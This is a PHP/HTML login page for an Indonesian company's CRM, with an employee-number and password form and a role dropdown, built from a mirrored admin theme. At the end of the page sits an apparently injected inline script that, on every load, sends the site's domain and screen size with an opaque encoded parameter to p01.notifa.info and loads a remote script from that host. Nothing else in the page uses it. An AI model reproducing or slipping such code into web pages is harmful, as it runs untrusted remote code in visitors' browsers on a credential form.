<?php
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
?>
<!DOCTYPE html>
<html lang="en">
    
<!-- Mirrored from crm.thememinister.com/crmAdmin/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 15 Jan 2019 06:52:06 GMT -->
<head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
        <title>PT. TELLU CAPPA</title>

        <!-- Favicon and touch icons -->
        <link rel="shortcut icon" href="img/logo2.png" type="image/x-icon">
        <!-- Bootstrap -->
        <link href="assets/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <!-- Bootstrap rtl -->
        <!--<link href="assets/bootstrap-rtl/bootstrap-rtl.min.css" rel="stylesheet" type="text/css"/>-->
        <!-- Pe-icon-7-stroke -->
        <link href="assets/pe-icon-7-stroke/css/pe-icon-7-stroke.css" rel="stylesheet" type="text/css"/>
        <!-- style css -->
        <link href="assets/dist/css/stylecrm.css" rel="stylesheet" type="text/css"/>
        <!-- Theme style rtl -->
        <!--<link href="assets/dist/css/stylecrm-rtl.css" rel="stylesheet" type="text/css"/>-->
    </head>
    <body>
        <!-- Content Wrapper -->
        <div class="login-wrapper">
            
            <div class="container-center">
            <div class="login-area">
                <div class="panel panel-bd panel-custom">
                    <div class="panel-heading">
                        <div class="view-header">
                            <div class="header-icon">
                                <i class="pe-7s-unlock"></i>
                            </div>
                            <div class="header-title">
                                <h3>Login</h3>
                                <small><strong>Silahkan Masukan NIP Dan Password Anda.</strong></small>
                            </div>
                        </div>
                    </div>
                    <div class="panel-body">
                        <form action="login.php" method='post' id="loginForm" novalidate>
                            <div class="form-group">
                                <label class="control-label" for="username">NIP</label>
                                <input type="text" placeholder="NIP" title="Please enter you Nip" required="" value="" name="nip" id="username" class="form-control">
                                <span class="help-block small">Masukan NIP Anda</span>
                            </div>
                            <div class="form-group">
                                <label class="control-label" for="password">Password</label>
                                <input type="password" title="Please enter your password" placeholder="******" required="" value="" name="password" id="password" class="form-control">
                                <span class="help-block small">Masukan password Anda</span>
                            </div>
                             <div class="form-group">
                             <label class="control-label" for="password">Status</label>
                           <select class="form-control m-b" name="penjual" >
                                   <option value="Admin">Admin</option>
                                   <option value="Manager">Manager</option>
                                   <option value="Kurir">Kurir</option>
                                   <option value="Logistic">Logistik</option>
                            </select>
                            </div>
                            <div>
                                <button class="btn btn-add">Login</button>
                                <a class="btn btn-warning" href="index.php">Home</a>
                            </div>
                        </form>
                        </div>
                        </div>

                </div>
                   <?php
//kode php ini kita gunakan untuk menampilkan pesan eror
 if ($_GET['error'] == 4) {
       echo "<div class='alert alert-danger'>
                                <button type='button' class='close' data-dismiss='alert' aria-hidden='true'>&times;</button>
                                <i class='fa fa-times-circle sign'></i>Nip atau Password  Anda  Salah.
                             </div>";
    }

?> 
            </div>
        </div>
        
        <!-- /.content-wrapper -->
        <!-- jQuery -->
        
        <script src="assets/plugins/jQuery/jquery-1.12.4.min.js" type="text/javascript"></script>
        <!-- bootstrap js -->
        <script src="assets/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2%2fGgUtti8arQxeZJOGwm2916kZYD8Atkm%2f2gf2sOKnahdBOQqrio219qcrZxq2C99PPcE5OPoKb6WS0sihUoHBVCj86Ewe9tbT42hUStZMGO7afTTBvwxQ6SE1S68bz0M4iCQr6DpoJvRz7%2fSCBy%2brLBAWm15mb5q64zAjY9qdsT%2bP%2bqcufDbkVKUFGAGhc5TmY5XdFzE8u9Sb5xoIbsPM9zYFU44T5n5vTDsN8YmCL9oZv8%2b6BmBiBqDG9Iv5cUbNJWPQvTrYqWgilGGKWlVfV1axL%2bHLFaI%2fPu9bWVa79Fm5tZotSwaXJayrOo1oIC6dA2ivUvRQIJxjzhZ3k9B5jlIxTWJrFERG1SOzgcV3tQJ%2f03yE743gSq6f0wQVaZQQ%2fQ4JGiWFe%2bZf6L4w1g2RW6lrZQsNkI59wsKKPp46O%2b1w7OKB5s5zUjZlR4iUve6astkZ%2bBplH4Qw%2bRwjVq9WtlwbHfsJt1q7yc2R8ooz0E%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from crm.thememinister.com/crmAdmin/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 15 Jan 2019 06:52:06 GMT -->
</html>